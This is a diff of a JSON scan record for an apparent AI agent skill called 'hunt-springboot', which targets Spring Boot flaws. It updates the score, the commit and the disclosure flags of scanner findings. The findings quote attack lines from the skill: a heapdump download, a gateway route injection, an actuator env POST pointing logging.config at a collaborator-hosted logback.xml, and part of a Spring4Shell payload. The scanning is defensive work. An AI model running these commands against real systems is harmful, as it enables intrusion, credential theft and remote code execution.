@@ -5,15 +5,15 @@
   "path": "skills/hunt-springboot",
   "name": "hunt-springboot",
   "description": "Hunt Spring Boot specific vulnerabilities — Actuator endpoints (heapdump, env, loggers, mappings, shutdown), Spring Expression Language (SpEL) injection → RCE, H2 console RCE, Jolokia JMX exposure, Spring4Shell (CVE-2022-22965), Spring Cloud Function SPEL (CVE-2022-22963), heap dump credential extraction. Use when target runs Spring Boot — detected via X-Application-Context header, /actuator, Whitelabel Error Page, or Java stack traces.",
-  "stars": 23831,
+  "stars": 26672,
   "category": "security",
-  "commit": "c5ff11779ee00beda2cbe05d5093fcd4ecba8f04",
-  "contentHash": "4957d9d2cfe1eae4fc17907db14524507fbf0ff4e90ef6140d4e7b3a87e959d5",
+  "commit": "c50d32fe4e6578b7606428023547de654c1c97b9",
+  "contentHash": "b8401d4db18ad073fd96ed1bfeb9fa146cc1bea4353586a8a023db913a6653c5",
   "repoCreatedAt": "2026-05-05T11:22:32Z",
   "alsoFoundIn": [],
   "status": "ok",
   "incomplete": false,
-  "scannedAt": "2026-11-26T11:36:54.718Z",
+  "scannedAt": "2026-11-28T10:59:08.925Z",
   "scan": {
     "findings": [
       {
@@ -32,7 +32,7 @@
         "file": "skills/hunt-springboot/SKILL.md",
         "line": 28,
         "excerpt": "curl -sI https://$TARGET/ | grep -i \"x-application-context\\|x-content-type\"",
-        "disclosed": true,
+        "disclosed": false,
         "automatic": false
       },
       {
@@ -84,7 +84,7 @@
         "file": "skills/hunt-springboot/SKILL.md",
         "line": 47,
         "excerpt": "BASE=\"https://$TARGET/actuator\"",
-        "disclosed": true,
+        "disclosed": false,
         "automatic": false
       },
       {
@@ -146,7 +146,7 @@
         "file": "skills/hunt-springboot/SKILL.md",
         "line": 82,
         "excerpt": "curl -s \"$BASE/heapdump\" -o /tmp/heapdump.hprof",
-        "disclosed": true,
+        "disclosed": false,
         "automatic": false
       },
       {
@@ -165,7 +165,7 @@
         "file": "skills/hunt-springboot/SKILL.md",
         "line": 105,
         "excerpt": "curl -s \"https://$TARGET/h2-console\" | grep -i \"H2 Console\\|H2 Database\"",
-        "disclosed": true,
+        "disclosed": false,
         "automatic": false
       },
       {
@@ -206,7 +206,7 @@
         "file": "skills/hunt-springboot/SKILL.md",
         "line": 138,
         "excerpt": "curl -s -X POST \"https://$TARGET/api/user/name\" \\",
-        "disclosed": true,
+        "disclosed": false,
         "automatic": false
       },
       {
@@ -234,8 +234,8 @@
       {
         "ruleId": "network",
         "file": "skills/hunt-springboot/SKILL.md",
-        "line": 161,
-        "excerpt": "curl -s -X POST \"$BASE/actuator/gateway/routes/hax\" -H \"Content-Type: application/json\" \\",
+        "line": 162,
+        "excerpt": "curl -s -X POST \"$BASE/actuator/gateway/routes/test_probe\" -H \"Content-Type: application/json\" \\",
         "disclosed": false,
         "automatic": false,
         "hosts": []
@@ -243,15 +243,15 @@
       {
         "ruleId": "shell",
         "file": "skills/hunt-springboot/SKILL.md",
-        "line": 161,
-        "excerpt": "curl -s -X POST \"$BASE/actuator/gateway/routes/hax\" -H \"Content-Type: application/json\" \\",
-        "disclosed": true,
+        "line": 162,
+        "excerpt": "curl -s -X POST \"$BASE/actuator/gateway/routes/test_probe\" -H \"Content-Type: application/json\" \\",
+        "disclosed": false,
         "automatic": false
       },
       {
         "ruleId": "network",
         "file": "skills/hunt-springboot/SKILL.md",
-        "line": 163,
+        "line": 164,
         "excerpt": "curl -s -X POST \"$BASE/actuator/gateway/refresh\"; curl -s \"$BASE/actuator/gateway/routes\"",
         "disclosed": false,
         "automatic": false,
@@ -260,7 +260,7 @@
       {
         "ruleId": "network",
         "file": "skills/hunt-springboot/SKILL.md",
-        "line": 170,
+        "line": 177,
         "excerpt": "curl -s -X POST \"$BASE/actuator/env\" -H \"Content-Type: application/json\" -d '{\"name\":\"logging.config\",\"value\":\"http://$COLLAB/logback.xml\"}'",
         "disclosed": false,
         "automatic": false,
@@ -271,33 +271,33 @@
       {
         "ruleId": "shell",
         "file": "skills/hunt-springboot/SKILL.md",
-        "line": 170,
+        "line": 177,
         "excerpt": "curl -s -X POST \"$BASE/actuator/env\" -H \"Content-Type: application/json\" -d '{\"name\":\"logging.config\",\"value\":\"http://$COLLAB/logback.xml\"}'",
-        "disclosed": true,
+        "disclosed": false,
         "automatic": false
       },
       {
         "ruleId": "shell",
         "file": "skills/hunt-springboot/SKILL.md",
-        "line": 185,
+        "line": 192,
         "excerpt": "curl -s \"https://$TARGET/api/user\" \\",
-        "disclosed": true,
+        "disclosed": false,
         "automatic": false
       },
       {
         "ruleId": "shell",
         "file": "skills/hunt-springboot/SKILL.md",
-        "line": 191,
+        "line": 198,
         "excerpt": "--data-raw \"username=test&password=test&class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di+if(%22j%22.equals(request.getParam",
-        "disclosed": true,
+        "disclosed": false,
         "automatic": false
       },
       {
         "ruleId": "shell",
         "file": "skills/hunt-springboot/SKILL.md",
-        "line": 200,
+        "line": 207,
         "excerpt": "curl -s \"https://$TARGET/jolokia\" | python3 -m json.tool 2>/dev/null | head -20",
-        "disclosed": true,
+        "disclosed": false,
         "automatic": false
       },
       {
@@ -305,7 +305,7 @@
         "file": ".claude-plugin/plugin.json",
         "line": 29,
         "excerpt": "\"command\": \"python3\",",
-        "disclosed": true,
+        "disclosed": false,
         "automatic": true
       }
     ],
@@ -313,7 +313,7 @@
       "network": 36,
       "shell": 11
     },
-    "score": 92,
+    "score": 90,
     "band": "low",
     "rulesVersion": "1.3.0",
     "filesScanned": 3,
@@ -390,6 +390,12 @@
       "commit": "c5ff11779ee00beda2cbe05d5093fcd4ecba8f04",
       "scannedAt": "2026-11-26T11:36:54.718Z",
       "score": 92,
+      "rulesVersion": "1.3.0"
+    },
+    {
+      "commit": "c50d32fe4e6578b7606428023547de654c1c97b9",
+      "scannedAt": "2026-11-28T10:59:08.925Z",
+      "score": 90,
       "rulesVersion": "1.3.0"
     }
   ]
